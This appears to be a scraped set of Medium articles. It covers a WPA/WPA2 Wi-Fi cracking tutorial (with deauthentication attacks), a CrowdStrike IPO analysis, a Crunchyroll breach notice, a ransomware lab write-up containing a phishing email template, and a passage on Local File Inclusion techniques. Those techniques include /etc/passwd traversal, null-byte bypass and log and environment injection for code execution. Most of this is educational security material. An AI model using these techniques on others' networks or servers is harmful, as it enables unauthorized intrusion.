There’s a reason for that: I want a visual reminder at all times that my privacy and security come first. Until Apple allows users to set browsers other than Safari as the default web browser on iOS — and it currently does not — this is what I do to put security and privacy first on my pocket computer.
My recommendations are as follows:
Start implementing some of the changes we discussed above and let me know what works/doesn’t work for you. I always try to respond to every comment, so if you’ve got a favorite security or privacy hack, please share: we always learn better, faster, and more efficiently as a community.
In my next deep dive, I’ll take a look at another group of privacy- and security-minded changes, including Robocalls, more secure email/calendaring, secure messaging, 2FA/U2F setup and usage, and my best practices for using Twitter, Facebook, Snapchat, and Instagram as securely as possible. Until then …
Surf safe!
Written by
","['Directory', 'Podcast', 'NordVPN', 'DuckDuckGo', 'StartPage', 'Security', 'Tech', 'Technology', 'Cybersecurity', 'How To']"
Crack WPA/WPA2 Wi-Fi Routers with Aircrack-ng and Hashcat,https://medium.com/@brannondorsey/crack-wpa-wpa2-wi-fi-routers-with-aircrack-ng-and-hashcat-a5a5d3ffea46?source=tag_archive---------0-----------------------,"Crack WPA/WPA2 Wi-Fi Routers with Airodump-ng and Aircrack-ng/Hashcat.
This is a brief walk-through tutorial that illustrates how to crack Wi-Fi networks that are secured using weak passwords. It is not exhaustive, but it should be enough information for you to test your own network’s security or break into one nearby. The attack outlined below is entirely passive (listening only, nothing is broadcast from your computer) and it is impossible to detect provided that you don’t actually use the password that you crack. An optional active deauthentication attack can be used to speed up the reconnaissance process and is described at the end of this document.
If you are familiar with this process, you can skip the descriptions and jump to a list of the commands used at the bottom. This tutorial is also posted on GitHub. Read it there for the most up-t0-date version and BASH syntax highlighting.
DISCLAIMER: This software/tutorial is for educational purposes only. It should not be used for illegal activity. The author is not responsible for its use. Don’t be a dick.
This tutorial assumes that you:
Begin by listing wireless interfaces that support monitor mode with:
If you do not see an interface listed then your wireless card does not support monitor mode �
We will assume your wireless interface name is wlan0 but be sure to use the correct name if it differs from this. Next, we will place the interface into monitor mode:
Run iwconfig. You should now see a new monitor mode interface listed (likely mon0 or wlan0mon).
Start listening to 802.11 Beacon frames broadcast by nearby wireless routers using your monitor interface:
You should see output similar to what is below.
For the purposes of this demo, we will choose to crack the password of my network, “hackme”. Remember the BSSID MAC address and channel (CH) number as displayed by airodump-ng, as we will need them both for the next step.
WPA/WPA2 uses a 4-way handshake to authenticate devices to the network. You don’t have to know anything about what that means, but you do have to capture one of these handshakes in order to crack the network password. These handshakes occur whenever a device connects to the network, for instance, when your neighbor returns home from work. We capture this handshake by directing airmon-ng to monitor traffic on the target network using the channel and bssid values discovered from the previous command.
Now we wait… Once you’ve captured a handshake, you should see something like [ WPA handshake: bc:d3:c9:ef:d2:67 at the top right of the screen, just right of the current time.
If you are feeling impatient, and are comfortable using an active attack, you can force devices connected to the target network to reconnect, be sending malicious deauthentication packets at them. This often results in the capture of a 4-way handshake. See the deauth attack section below for info on this.
Once you’ve captured a handshake, press ctrl-c to quit airodump-ng. You should see a .cap file wherever you told airodump-ng to save the capture (likely called -01.cap). We will use this capture file to crack the network password. I like to rename this file to reflect the network name we are trying to crack:
The final step is to crack the password using the captured handshake. If you have access to a GPU, I highly recommend using hashcat for password cracking. I’ve created a simple tool that makes hashcat super easy to use called naive-hashcat. If you don’t have access to a GPU, there are various online GPU cracking services that you can use, like GPUHASH.me or OnlineHashCrack. You can also try your hand at CPU cracking with Aircrack-ng.
Note that both attack methods below assume a relatively weak user generated password. Most WPA/WPA2 routers come with strong 12 character random passwords that many users (rightly) leave unchanged. If you are attempting to crack one of these passwords, I recommend using the Probable-Wordlists WPA-length dictionary files.
Before we can crack the password using naive-hashcat, we need to convert our .cap file to the equivalent hashcat file format .hccapx. You can do this easily by either uploading the .cap file to https://hashcat.net/cap2hccapx/ or using the cap2hccapx tool directly.
Next, download and run naive-hashcat:
Naive-hashcat uses various dictionary, rule, combination, and mask (smart brute-force) attacks and it can take days or even months to run against mid-strength passwords. The cracked password will be saved to hackme.pot, so check this file periodically. Once you’ve cracked the password, you should see something like this as the contents of your POT_FILE:
Where the last two fields separated by : are the network name and password respectively.
If you would like to use hashcat without naive-hashcat see this page for info.
Aircrack-ng can be used for very basic dictionary attacks running on your CPU. Before you run the attack you need a wordlist. I recommend using the infamous rockyou dictionary file:
Note, that if the network password is not in the wordlist you will not crack the password.
If the password is cracked you will see a KEY FOUND! message in the terminal followed by the plain text version of the network password.
A deauth attack sends forged deauthentication packets from your machine to a client connected to the network you are trying to crack. These packets include fake “sender” addresses that make them appear to the client as if they were sent from the access point themselves. Upon receipt of such packets, most clients disconnect from the network and immediately reconnect, providing you with a 4-way handshake if you are listening with airodump-ng.
Use airodump-ng to monitor a specific access point (using -c channel --bssid MAC) until you see a client (STATION) connected. A connected client look something like this, where is 64:BC:0C:48:97:F7 the client MAC.
Now, leave airodump-ng running and open a new terminal. We will use the aireplay-ng command to send fake deauth packets to our victim client, forcing it to reconnect to the network and hopefully grabbing a handshake in the process.
You can optionally broadcast deauth packets to all connected clients with:
Once you’ve sent the deauth packets, head back over to your airodump-ng process, and with any luck you should now see something like this at the top right: [ WPA handshake: 9C:5C:8E:C9:AB:C0. Now that you’ve captured a handshake you should be ready to crack the network password.
Below is a list of all of the commands needed to crack a WPA/WPA2 network, in order, with minimal explanation.
Much of the information presented here was gleaned from Lewis Encarnacion’s awesome tutorial. Thanks also to the awesome authors and maintainers who work on Aircrack-ng and Hashcat.
Shout out to DrinkMoreCodeMore, hivie7510, cprogrammer1994, hartzell, flennic, bhusang, tversteeg, gpetrousov, crowchirp and Shark0der who also provided suggestions and typo fixes on Reddit and GitHub. If you are interested in hearing some proposed alternatives to WPA2, check out some of the great discussion on this Hacker News post.
Written by
","['Kali linux', 'Aircrack-ng', 'monitor mode', 'this one', 'here', 'Hacking', 'Wifi', 'Kali Linux', 'Cracking', 'Cybersecurity']"
CrowdStrike IPO | S-1 Breakdown - Alex Clayton - Medium,https://medium.com/@alexfclayton/crowdstrike-ipo-s-1-breakdown-3f00b06f7a3a?source=tag_archive---------4-----------------------,"Company Overview
CrowdStrike Holdings, or CrowdStrike, filed for a $100M IPO with Goldman Sachs leading the offering. The $100M dollar amount is a placeholder and it’s likely they will raise significantly more. The company plans to trade on the Nasdaq under the symbol “CRWD”. CrowdStrike is a leading cybersecurity company with a mission to protect their customers from breaches. With their Falcon platform, the company says they have created the first cloud-native security solution that can protect workloads across any environment, and is underpinned by two main pillars 1) an intelligent lightweight agent and 2) their cloud-based graph database called Threat Graph. CrowdStrike believes they have created a new category called the “Security Cloud”, with the aim to transform the security industry much like what has happened to other industries like HR, CRM, etc. The company calls out the tectonic shift to the cloud, workforce mobility, growth in connected devices (which in many cases are outside the traditional security perimeter), along with the continuous sophistication of adversaries attacking this ever increasing digital surface area as trends demanding a new, cloud-first approach to cybersecurity, such as their Falcon Platform. CrowdStrike has grown rapidly to date and has 2,516 subscription customers globally (as of Jan-19) which include some of the world’s largest companies. The company was founded in 2011 and launched its first endpoint security product in 2013. CrowdStrike is based in Sunnyvale, California and has 1,455 full-time employees.
Below is a list of company milestones from the S-1:
Product Offering
CrowdStrike’s Falcon platform is a security solution capable of protecting workloads irrespective of environment and works across a variety of endpoints such as laptops, desktops, servers, virtual machines, and IoT devices. The two main pillars are a lightweight endpoint agent, which occupies less than 35 megabytes of storage space and supports Windows, Mac and Linux operating systems, and a database called Threat Graph. CrowdStrike processes data from endpoints, which they crowdsource from their entire customer base, and use AI and behavior pattern-matching to stop breaches. In early 2017 the company moved away from a single offering into 10 cloud modules, all subscription-based. CrowdStrike has been successful in upselling modules and as of Jan-2019, 47% of subscription customers have bought 4+ modules. Unfortunately, there is no breakout of revenue or ARR by product but I suspect that most of their revenue is from the endpoint security products. Below are descriptions of the categories and cloud modules:
Endpoint Security
Security and IT Operations
Threat Intelligence
CrowdStrike also recently launched the CrowdStrike Store, which is the first open platform as a service, or PaaS, for cybersecurity. This allows customers to purchase additional products from CrowdStrike partners and utilize the same CrowdStrike agent. Lastly, the company announced CrowdStrike Falcon for Mobile, which is their EDR solution for mobile devices that will be available later this year.
Summary Metrics and GTM (Go-to-Market)
CrowdStrike has significant scale and is growing incredibly quickly. And while their operating losses are in the red, they’re gaining operating leverage. The company did $249.8M of total revenue in FY’19, up 110% YoY. Almost 90% of their revenue is subscription-based and ended FY’19 at $312.7M of ending ARR, up 121% YoY. With that said, the company still has large losses — non-GAAP operating loss was $(115.8)M in FY’19, a (46)% margin, although that is up from a (100)% non-GAAP operating margin in FY’18. CrowdStrike ended FY’19 with 2,516 subscription customers, up 103% YoY and their implied ACV (annual contract value) was $124.3K in FY’19 (ARR/customers). Their dollar-based net retention rate was very strong in FY’19 at 147%, up from 119% in FY’18. Dollar-based gross retention was 98% in FY’19. Below are other relevant stats from their S-1:
CrowdStrike primarily sells through a direct sales team that leverages a network of channel partners. The direct sales team is segmented by inside and field sales reps based on the number of customer endpoints. More recently the company launched a free trial of the Falcon Prevent module (next-gen antivirus) available directly from the CrowdStrike website or through the AWS Marketplace. CrowdStrike got their start by just focusing on large enterprises but now sells to any size of company from hundreds of thousands of endpoints to as little as 3. They generally price by endpoint and by module. Unlike most SaaS companies, professional services provide strong lead generation for CrowdStrike — they offer Incident Response Services to companies and disclose that among companies that first became a customer after February 1st, 2017, for each $1.00 spent by those customers on their services engagement, it generated $2.97 in ARR.
Market Opportunity
The cybersecurity market is growing rapidly, and the cloud-based market is growing even faster. And while CrowdStrike believes their market initially began as a replacement market for the legacy AV market, it has expanded to include markets even outside of traditional cybersecurity like IT service management. CrowdStrike believes they serve the following markets;
Overall, the company thinks their global TAM is $24.6B in 2019 and is expected to reach $29.2B by 2021. For some comparison, Zscaler, another cloud-based cybersecurity company that went public in early 2018 believed their TAM to be $17.7B.
Competition
CrowdStrike is selling into a hard-fought market and says they compete in 3 segments. Incumbents in the antivirus market, which CrowdStrike considers more legacy players with their signature-based approaches, which include McAfee and Symantec. Other modern endpoint security providers such as Cylance (which was acquired by Blackberry in 2018 for $1.4B), Carbon Black which went public in 2018, and Cybereason*. CrowdStrike also thinks they compete with network security vendors such as Palo Alto Networks and FireEye which are supplementing their core perimeter-based offerings with endpoint security solutions.
CrowdStrike and one of their main competitors, Cylance, have a close history. CrowdStrike’s CEO, George Kurtz, was the CEO and co-founder of Foundstone which was acquired by McAfee in 2004. Stuart McClure, who was the CEO/founder of Cylance, was also a founder and CTO at Foundstone. Both left McAfee to build successful very companies.
Investors and Ownership
According to Pitchbook, CrowdStrike has raised $481.2M to date from investors including General Atlantic, Warburg Pincus, Accel, CapitalG (Google Capital), IVP, March Capital Partners, Telstra Ventures and others. 5%+ pre-offering institutional investor shareholders include Warburg Pincus (30.3%), Accel (20.3%) and CapitalG (11.2%). George Kurtz, CrowdStrike’s co-founder, President, and CEO, is at a 10.5% pre-offering stake. Their last round, which was a $200M series E led by General Atlantic, IVP, and Accel in June-2018 was at a $3.15B pre-money valuation, according to Pitchbook.
Financials and Other Metrics Outputs
CrowdStrike is losing a lot of money but is gaining operating leverage — ending ARR grew from $141.3M in FY’18 with a (100)% non-GAAP operating margin to $312.7M in FY’19 with a (46)% non-GAAP operating margin. Their dollar-based net retention rate was quite high in FY’19 at almost 150% and it’s clear their strategy of upselling cloud modules is working. Moreover, their sales efficiency has improved over the past 4 quarters. Their implied months to pay back, which is the inverse of a CAC ratio (net new ARR * gross margin/sales and marketing spend of the prior quarter), has gone from 24 months in Apr-18 to 14 months in the most recent quarter. The median months to pay back in their disclosure period was 16.5. The company does not release customer counts by quarter. CrowdStrike has $191.7M of cash and marketable securities on their balance sheet and raised $481.2M, implying they have burned through almost $300M of cash to get to $312.7M of ARR, which is very impressive. Outputs of other metrics are below.
Historical P&L & Metrics (000's)
Quarterly Subscription Revenue ($M)
Ending ARR ($M)
Unlike almost all other SaaS companies, CrowdStrike actually releases ARR as a metric in their S-1. The company added $59M of net new ARR over the past quarter and $171.3M over the past year.
Dollar-Based Gross and Net Retention Rates
The number of CrowdStrike customers that purchase multiple cloud modules is rising and so are their gross and net retention dollar rates.
Subscription Customers with 4 or More Cloud Module Subscriptions
CrowdStrike’s platform strategy is working — as you can see below almost half of their total subscription customers have 4+ of their products and the number continues to rise quarter-over-quarter.
Quarterly GAAP Gross Margins
Quarterly non-GAAP Operating Expenses as a % of Revenue
CrowdStrike’s expenses as a percent of revenue are coming down.
Quarterly GAAP and Non-GAAP Operating Margins
While operating margins are increasing.
Revenue Mix Percentage
Sales Efficiency and Payback Periods
As mentioned previously, CrowdStrike’s sales efficiency has been improving over the past 4 quarters. CrowdStrike doesn’t release customer counts by quarter, but the below output plots their implied months to payback using the inverse of a CAC ratio (net new ARR * gross margin/sales and marketing spend of the prior quarter). The magic number is defined as just net new ARR/sales and marketing spend of the prior quarter. Both metrics are improving and the months to pay back are decreasing.
Cash Flows ($M)
Quarterly P&L / Metrics (000's)
Valuation
CrowdStrike, like other high-growth software businesses with losses, will be valued on a multiple of forward revenue. The output below uses NTM (next-twelve-months) revenue as a proxy based on an illustrative range of growth rates with FY’19 as the base (companies don’t release projections in S-1's). The output also includes an ARR multiple range. Given CrowdStrike’s triple-digit year-over-year revenue growth, it’s likely they can grow 70–90% in FY’20. Given the multiples that similar, high-growth software companies are trading at today; Zoom, PagerDuty, Zscaler, Okta, MongoDB, Elastic, Coupa and others trading at 20–30x+ NTM revenue (as of 19-May-2019), I suspect CrowdStrike will trade well above their last reported private valuation of $3.15B. Carbon Black, which operates in CrowdStrike’s market, trades at ~5x NTM revenue but estimates have them growing at only ~15% over the next twelve months.
CrowdStrike is growing ARR in the triple digits and operating in a massive security market where the trends are moving in their favor — legacy antivirus solutions are becoming less effective, the traditional security perimeter is less relevant, the attack surface area is increasing along with the sophistication and the sheer number of breaches. Enterprises of all sizes need a cloud-first security platform that utilizes AI and can protect any workload, regardless of environment. Moreover, while CrowdStrike still has heavy losses, they have strong net dollar retention and sales efficiency. It’s clear they’re getting leverage in their business model — CrowdStrike should be investing to gain market share. There’s also a great story for them to move outside of security and deeper into IT operations where they have already launched a few products. Some public market investors will likely be nervous about the high losses, but CrowdStrike is in a great position to capitalize — they should have a very successful IPO.
Lastly, CrowdStrike’s CEO, George Kurtz, might be the only software CEO that drives race cars. See the disclosure in the S-1 below:
“As part of our sales and marketing activities, we sponsor a CrowdStrike-branded professional racing car, which our President and Chief Executive Officer drives in some races at no incremental cost to us and in lieu of us hiring a professional driver. As we do not pay any amounts to our President and Chief Executive Officer under these arrangements, it is not reflected in the above table.”
To sign up to receive these post by email, click here.
*Spark Capital is an investor in Cybereason.
Written by
","['Venture Capital', 'Crowdstrike', 'Cybersecurity', 'IPO', 'Security']"
Crunchyroll.com update - Ellation,https://blog.ellation.com/crunchyroll-com-update-a2a593cf9155?source=tag_archive---------0-----------------------,"At 3:30am PST this morning, malicious individuals gained access and altered our Cloudflare configuration. Cloudflare sits between incoming visitors and Crunchyroll, and normally redirects traffic to Crunchyroll servers. The attackers redirected incoming visitors intended for the Crunchyroll.com website to a non-Crunchyroll-hosted server with the intent for visitors to download a malicious file, named “CrunchyViewer.exe.” This file is malware directly targeting Windows PC web users. We took down the site at 6:00am PST as a precaution and were able to re-secure and restore the correct configuration to our Cloudflare service at 9:00am PST. The Crunchyroll service was fully restored by 9:30am. We’ve identified this as an isolated attack on our Cloudflare layer, and not Crunchyroll itself. As such, our servers were not compromised in any way, and none of our users’ secure information and data was at risk. We take security very seriously, and will pursue this malicious attack on our users to the fullest extent of the law. We will continue to provide updates as we gather more information.
If you were a Windows user who downloaded the malware file from 3:30am to 9:00am PST this morning, it is important to take these steps to remove the malware from your system:
If you downloaded but did not run the file, you are not exposed to the effects of this malware.
If you downloaded and ran the “CrunchyViewer.exe” application:
We are providing the above instruction to assist you with the removal of the .exe file. We recommend that you contact Microsoft or other knowledgeable technical support directly for specific questions related to the Windows operating system.
If you have any further questions about your Crunchyroll account, please contact our Customer Support Team: http://www.crunchyroll.com/help?topic=contact
Written by
","['About Ellation', 'Cybersecurity']"
Cryptography + Malware = Ransomware - HackerNoon.com - Medium,https://medium.com/hackernoon/cryptography-malware-ransomware-36a8ae9eb0b9?source=tag_archive---------5-----------------------,"When you combine cryptography with malware, you get a very dangerous mix of problems. This is a type of computer virus that goes by another name, “ransomware”. This type of virus is part of a field of study called “cryptovirology”. Through the use of techniques called phishing, a threat actor sends the ransomware file to an unknowing victim. If the file is opened it will execute the virus payload, which is malicious code. The ransomware runs the code that encrypts user data on the infected computer or host. The data are user files like documents, spreadsheets, photos, multimedia files and even confidential records. The ransomware targets your personal computer files and applies an encryption algorithm like RSA which makes the file unaccessible. The only way to access them is if the user pays a ransom to the threat actor by following instructions which appear encoded into the encrypted files. Thus it is called ransomware, because a form of payment is demanded in order to fix the problem.
The payment required must also be in cryptocurrency, in most cases Bitcoin. A more sinister type of ransomware will sometimes give users a deadline to complete the payment, otherwise the files could be lost forever. When the file is encrypted, the only way it can be recovered is with a decryption key or a powerful computer. The latter is not really available for most users so this makes attacks like this a very serious threat. The ransomware will also attempt to infect other computers on the network the infected host is connected to, so it also has worm like properties. It is also referred to as a “cryptoworm”. One of the earliest known ransomware to appear was Cryptolocker, which caused chaos between September 2013 to late May 2014. Ransomware is classified as a type of cybercrime that is sometimes mentioned under “Crime-as-a-Service” when used to extort money.
According to an IEEE Security and Privacy conference presentation in 1996 (Adam Young and Moti Yung), this is how ransomware works:
When the threat actors are one step ahead it becomes very important to be able to prevent these attacks and also find the ways to mitigate them. There are many variants now, and trying to keep up with the latest is becoming harder since these can be zero day attacks. I recently did my own analysis of ransomware using a lab to better understand how it works. I will provide the demo for informational purposes only, this should not be attempted at home unless you know what you are doing. These have grave consequences and if you are caught spreading an actual computer virus, that is punishable by law. I created a sandbox that is not connected to a production network, but rather isolated in its own environment. I then used a modified (less malicious) version of the ransomware for my analysis.
I have 4 computers for this lab using the TCP/IP protocol in a LAN setting. HOST1 running Kali Linux is configured to perform the attack against another computer called HOST2 which is running Windows 7. I also add a mail server with an AD domain running Windows Server 2012 called SERVER1. HOST1 connects to SERVER1, while HOST1 is a separate computer that is not a part of the domain. Finally there is a simple DNS server named DNS1 that provides name services and SMTP for the virtual environment’s network.
I use a static IP on all computers and created static DNS name entries to simplify this network, no firewall or router is between HOST1 and HOST2. These computers are running in their own network, not connected to any production environment. I won’t go into too much technical detail with the setup, but I have provided a network diagram below. There are other ways this setup could have been done which does not require a server. You can just open the infected message directly on a computer. The reason I setup the network is to observe how the ransomware tries to spread. (Note: No patches were applied and no Antivirus or third party security product has been installed for this demo)
Before I begin, let me discuss a ransomware called WannaCry aka WCry (May 2017) to give an example of a real ransomware attack. When this became news, I suppose it may have also been the first time many people have heard of Bitcoin, the cryptocurrency payment required by the ransomware. That must have shed some bad light on Bitcoin, as people will assume it is what criminals use for payments. For infected users who don’t know how to use cryptocurrency, this would have required a crash course. A user would have to make the payment using Bitcoin, which uses the BTC token. This would require users to go on a digital exchange and then buy a certain amount of Bitcoin. They must then make the payment to the public address provided by the ransomware. From that moment it is a waiting game, as anxious users await what happens next. The worst case is that the threat actors don’t send any decryption key and thus the data could be lost forever.
The reason threat actors use cryptocurrency for payments is to establish some anonymity, though by design Bitcoin is not designed for privacy. It is pseudonymous, which means that it can still be traced to a bank account or user on a digital exchange when cashing out is attempted. The problem is that there are many layers to uncover during an investigation because the Bitcoin can be passed from one address to another and then converted to another cryptocurrency. That is what makes tracking down ransomware payments much more difficult. This why preventing ransomware is very important to consider.
WannaCry made use of an exploit on Windows operating systems that had a known vulnerability. Microsoft has a patch available for this vulnerability called MS17–010 (Microsoft security vulnerability affecting Microsoft Server Message Block 1.0 SMBv1) which can be downloaded from their website. This vulnerability exploits the Microsoft implementation of the Server Message Block (SMB) protocol. The ports 139 and 445 open on inbound connections on Windows computers running SMB will get infected if the patch is not applied. The NSA knew about this but did not share the information right away with Microsoft until after the leaks resulting from a compromised NSA server which contained the code that was the origin of this ransomware, courtesy of the Shadow Brokers.
The kill switch turns out to be an unregistered domain discovered as a flaw in the code which was supposed to unleash a payload that could do more damage. A researcher named “MalwareTech” who was investigating this, sink-holed the domain by registering it for $10.69 and that stopped the malware from spreading. How it started is not really known, but it appears to have been planted intentionally. Once the malware was planted, when executed it spread like a worm by propagating on vulnerable ports on unpatched Windows computers (from April 2017) and older versions of Windows without patches since April 2014, like XP and Server 2003 (Linux, Ubuntu, macOS and other Unix-variants were not much affected by this vulnerability).
The malware spreads by probing other computers running Windows on the same network, and beyond. Then like wildfire it spreads until a systems administrator will notice and immediately shut off firewalls or even turn off routers to prevent it from spreading. Now escalation is taken to another level with infected systems. This is because WCry encrypts the harddrive and all the data stored and requests a ransom of $300 to be paid in Bitcoin. Now this does not get any easier to ease the anxiety of the user because the ransom goes up if it is not paid within a certain amount of time. Paying in Bitcoin also increases the anxiety level since most users will not know much about cryptocurrency. There were an estimated 200,000 computers infected across 150 countries causing damages ranging from hundreds of millions to $4 Billion according to cyber risk firm Cyence.
I start from HOST1 to perform a phishing attack by sending an e-mail with the infected file. The infected file will be in Word format (DOCX file) and will be sent as an attachment from a bogus e-mail from HOST1 to the SERVER1 Exchange e-mail server on HOST2’s domain using an SMTP relay from DNS1. I did not configure any anti-relaying or anti-spam measures for this testing in order to work. I want HOST2 to receive the e-mail in its Outlook client by pulling the message from the Exchange server. So the message sent simulates a phishing attack. The message has the subject:
“URGENT: Please Open The File Attached To Fix Your Account”
The message is supposed to be from let’s say the victim’s hospital medical records department and in the message body we can write something like this:
========================================
Dear Valued Patient,
We recently detected strange activity from your account. Please open and read the file attached to fix the problem with your account.
Thank You,Customer Support
========================================
The message is made to appear urgent requiring a user to take immediate action. A threat actor or hacker will want the victim to open the message so they will try different tricks to make them open it. Messages like this would normally be blocked as spam by the company’s anti-spam filter or even quarantined by the antivirus because of suspicious attachments. All these are disabled for this testing, to simulate what could happen in the real world where security is sometimes not implemented properly. Without any protection from an AV or any other security product, the victim computer opens the message and double-clicks the e-mail attachment from Outlook. It then attempts to open the attachment in Microsoft Word.
An error message appears and the victim will think the program has crashed. What is actually happening here is that the modified ransomware has executed code to release its payload, and this is where the fun begins.
At this point, the victim will probably assume the file attachment was corrupt and go about their day. In the background, the ransomware begins to unleash its code and starts to encrypt the victim’s personal files, beginning with the “Users” folder and then the contents in “My Documents”. The original files are not changed, but the encrypted copy is an entirely different file from the original, which is deleted.
The victim will then try opening a file on their folders and suddenly notice that the names have changed. All files were encrypted with the same name “+REcovER+dpyww+”, but retain their file type as can be seen from the screen capture. This naming convention actually was a modification of the original style for the purpose of study. You will also notice that the date modified will be the same for the encrypted files. In this case you can see there are 3 files with the same file name modified on 5/29/2018 at 3:59 PM. Time does vary, depending on how fast and how many files the ransomware enumerated and encrypted. The date modified will be consistent. Operating system and program files are not encrypted. When the victim opens the file, they will see the following message instead (see below).
As you can see this ransomware was based on “TeslaCrypt”. No matter what file the victim opens, it will be renamed to “+REcovER+dpyww+” and they all open up to the same message. In a real attack you can find several ransom notes dropped on the PC in different folder locations. These notes are titled RECOVER[random symbols].txt, Howto_Restore_FILES.txt or How_Recover+(random symbols).txt. They may also come in an HTML and PNG file format. The RSA encryption algorithm was used by this ransomware on the victim’s files. The way to recover the files requires a private key from the server that generated it. The server holds the public key as well which was generated from the private key. This actually secures data on confidential systems, but applied in ransomware it is quite sinister because it is a form of extortion to force victims to pay to have their data recovered. The victim will need the private key to decrypt the files, and that is provided if they pay the ransom.
Let’s analyze the message we get from the ransomware. You are going to read this line under “What happened to your files?”:
“All Of Your Files Were Protected By A Strong Encryption With RSA-4096”
This tells victims that their files have been encrypted using the RSA encryption algorithm which we briefly discussed. The 4096 refers to the number of bits used in the encryption also called the key length. This gives a total of 2⁴⁰⁹⁶ distinct numbers or 1,234 digits, so it is a very strong encryption technique. You are then told you will not be able to “work with them, read them or see them”. This is like losing them forever, so this does make a victim desperate to try and recover the files. The message then continues by informing the victim that there is a server with a secret key, the private key, which can decrypt the files. This means that the ransomware used a public key to encrypt the files on the computer. Now in order to recover these files, the victim will need the so called “secret key” which is actually the private key that is used for decrypting the files encrypted with the public key.
The RSA algorithm involves 4 steps:
The threat actors have a key generation and distribution server which holds the private key. The problem is that the location of the server is hard to track because it can be in another country and its physical location remains a mystery unless there are clues.
The instructions then refer links to certain sites. I have not done this because I have no Internet connection, but in order to do this there is another requirement. Since the hackers want to keep things more under the radar they require the victim to install the TOR browser with a hyperlink to download. The TOR browser enables a more private connection which the hackers would need to avoid being easily tracked. There are more instructions to follow at the bottom of the message.
========================================
The server will destroy the key within 48 hours after encryption completed.
To retrieve the private key, you need to pay 2 bitcoins IMPORTANT YOU HAVE ONLY 48 HOURS IF U DON’T PAY ALL YOUR FILES WILL BE DELETED!
Bitcoins have to be sent to this address: (Bitcoin Address)
After you’ve sent the payment send us an email to : <e-mail address of hackers> with subject : DECRYPT-ID-<xxxxx>
========================================
It is easy to get caught up with the messages as the victim tries to find a solution. However another type of action might be taking place in the background. Certain ransomware attempt to spread the infection and it does this by probing ports on other Windows computers that are connected to the network. This variant and even the original did not have that behavior. Monitoring on ports 139 and 445 inbound on SERVER1 showed no signs of attack and there was no infection of files on the server either. There is a report that TeslaCrypt does attack network drives, but I was not able to create a network drive during this test. So it is still best practice to remove and isolate any infected system from the network as soon as possible.
The best way to combat ransomware of any kind, is to have an antivirus or security software installed. It is also best practice to keep the operating system (Windows, Linux, macOS, etc.) updated with the latest software patches and updates from vendors. Microsoft allows users to run automatic updates on their systems. Perhaps the best method is prevention.
Remember the following (Source: TrendMicro):
Another very important thing to consider, and the right thing to do on production networks, is to remove computers running Windows XP. These legacy systems are no longer supported by Microsoft and the recommendation is to upgrade or retire these systems. They were one of the main reasons the ransomware spread so fast. These systems are outdated and very open not just to ransomware but other vulnerabilities, including zero day exploits. If they are still required because they are running a legacy software, then they must be isolated from the Internet as much as possible or secured by a firewall setting that blocks vulnerable ports going to the Windows XP system’s subnet. Even Windows 7 systems, which are no longer supported by Microsoft should be considered for upgrades. There is no guarantee of protection from newer variants of ransomware on older Windows systems.
For corporate networks with enterprise operations the spread of ransomware can have damaging results. It has happened with some banks e.g. Ukrainian banks. The threat actors could have been state sponsored with the intent of extorting money or in some cases just to encrypt files to prevent access to data (no ransom). Systems Administrators must have a defense against ransomware attacks by hardening ports with IPS/IDS and anomaly report monitoring with alerts should there be any detection. Virus definitions now can stop ransomware with installed antivirus products and there are other security solutions that can detect ransomware at the Network Layer. Other strategies include segmenting the network to prevent the spread of infected systems. That is a way to isolate the ransomware from further attacking the network.
Phishing techniques like the example used in the simulated attack, can be prevented by a sound IT policy that informs users to never open unverifiable attachments from untrusted sources. Sometimes the message appears legit with the spoofed e-mail address of a company manager. To further prevent these attacks spam filters with virus definitions can block the message when implemented on the e-mail server. The company e-mail server can also be configured to prevent using the domain address by using an anti-relay setting which will not allow other users to use their system to send e-mail unless they are a part of that organization. Some companies might also require a digital signature if the message was indeed sent from a higher up. There are different policies for each company that depends on their business rules.
Getting infected by ransomware is much different than a typical virus or malware. The infected computer’s files are encrypted and there will be a demand for a ransom to the victim in order to recover the files. Many make the mistake of paying the ransom, but in some cases they do not get the private key to decrypt the files. This can also be a scam by hackers in order to get cryptocurrency. In some cases the private key has been recovered by a cybersecurity company and made available for infected computers.
I don’t discuss the ways to clean an infected system, but there is good information available from the No More Ransom Project. Google is of course the best place to start looking for anti-ransomware tools and utilities, but for more serious infections contacting a professional computer service provider is the best way to solve the problem.
References:
Written by
","['About', 'Help', 'Go Home', 'hybrid encryption', '3–2–1 rule', 'Security', 'Cryptography', 'Cybersecurity', 'Hacker', 'Ransomware']"
CVV #1: Local File Inclusion - InfoSec Write-ups - Medium,https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a?source=tag_archive---------4-----------------------,"This is a short series about “Common Vulnerability Vectors” and related exploitation-methods.
I’m gonna start this series with a quite known and therefore old vector: Local File Inclusion (short: “LFI”).
According to Wikipedia, “LFI” is described as:
A type of “File Inclusion Vulnerability”, […] that is most commonly found to affect web applications that rely on a scripting runtime […], local files i.e. files on the current server can be included for execution.”
There is also a short example (written in PHP) which describes the vulnerability (and it’s basic form) very well:
This example can be easily exploited by using Path Traversal for navigation and inclusion of a sensitive or useful file, in this example /etc/passwd/ based on the assumption that the server’s OS is based on Linux:
HTTP Response:
Although this type of vulnerability is very old, if found, there is a very likely chance to expand the “LFI” to a Remote Code Execution. So: Try to remember “LFI” when testing functions related to file-handling like templates, attachments, requests, read or write operations.
The following content describes methods based on my current knowledge who might be useful when expanding a “LFI” to a “RCE”.
Thanks to: _lavalamp, smiegles, arr0way, d.w., swisskey, rawsec_cyber, j.adriaans for contributing their knowledge to this topic.
[1] Path Truncation
PHP by default handles /etc/passwd like /etc/passwd/ or /etc/passwd/// or /./etc/passwd, trailing slashes are stripped of before opening the file. On the most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away. This allows to bypass a hard-coded file-extension by simply pushing the parameter with trailing slashes over it’s size:
[2] Nullbyte Injection
An URL-encoded nullbyte %00 can be used on PHP ≤ v.5.3. to cut off a hard-coded file-extension. This is possible due PHP’s relationship to C. In C a nullbyte represents the end of a string, therefore all chars after the nullbyte will be ignored.
[3] /proc/self
Because Linux-systems are using the file-structure for almost everything, the environment-variables of the current process (self) can be accessed via /proc/self/environ. One of the environment-variables set (if apache2 is running) is the user-agent which can be controlled through a HTTP request. In this case “RCE” can be achieved by requesting the file in combination with the payload written into the HTTP User-Agent field.
Similarly /proc/self/fd/<id> (or it’s symlink: /dev/fd) can be used in combination with the HTTP Referer field to inject the payload into opened error-logs by apache2. Although it’s needed to brute-force these ids first to determine currently active file-descriptors referring to the opened file.
[4] PHP wrapper
